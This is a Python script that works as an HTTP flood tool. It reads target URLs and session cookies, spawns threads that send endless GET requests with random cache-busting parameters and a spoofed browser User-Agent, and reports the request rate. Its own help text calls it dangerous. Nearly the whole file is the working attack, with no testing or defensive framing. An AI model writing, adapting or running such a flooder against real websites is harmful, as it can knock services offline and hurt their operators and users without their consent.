#!/usr/bin/env python3
try:
    import argparse
    import os, sys
    import _thread
    import random
    import time
    import requests
    import string
    from http.cookies import SimpleCookie
    
except ImportError as ie:
    print (ie)

parser = argparse.ArgumentParser(add_help = False, description = '%(prog)s is dangerous.')
parser.add_argument('-u','--urls', help = 'File with url targets [Example: %(prog)s -u urls.txt]')
parser.add_argument('-c','--cookies', help='File with cookies. [Example: %(prog)s -c cookies.txt]', default=None)
parser.add_argument('-t','--threads', help = 'Number of threads. [Example: %(prog)s -t 5]', type = int, default = 5)
args = parser.parse_args()

num_requests = 0
time_started = int(time.time())
time.sleep(1)

def readFile(f):
    f = open(f)
    text = []
    text = f.read()
    return text

def parseUrls(f):
	raw = readFile(f).splitlines()
	return raw

def launchThreadRequests(theardNumber):
	number = 0
	while True:
		number = number + 1
		sendRequest()

def parseCookies(rawCookies):
	cookie = SimpleCookie()
	cookie.load(rawCookies)
	cookies_r = {}

	for key, morsel in cookie.items():
		cookies_r[key] = morsel.value

	return cookies_r

def currentRequestsPerSecond():
	global num_requests
	global time_started
	transcurred = int(time.time()) - int(time_started)
	speed = num_requests / transcurred
	print(str(speed) + " r/s")

def randomString(stringLength=10):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(stringLength))

def sendRequest():
	global num_requests
	target = random.choice(urls) + "?" + randomString(4) + "=" + randomString()
	cookies_parsed = parseCookies(cookies)
	headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'}

	start = time.time()
	response = requests.get(target, cookies=cookies_parsed, headers=headers)
	end = time.time()

	num_requests = num_requests + 1

	responseStr = target + "\n"
	responseStr += str(response.status_code) + " in " + str(response.elapsed.total_seconds())

	currentRequestsPerSecond()

	print(responseStr)


if __name__ == "__main__":
    try:
    	global urls
    	global cookies
    	urls = parseUrls(args.urls)
    	cookies = readFile(args.cookies)

    	try:
    		for i in range(args.threads):
    			_thread.start_new_thread( launchThreadRequests, (f"{i}", ) )
    	except:
    		print ("Error: unable to start thread")

    	while 1:
   			pass
    except:
    	try:
	        sys.exit(0)
    	except SystemExit:
        	os._exit(0)
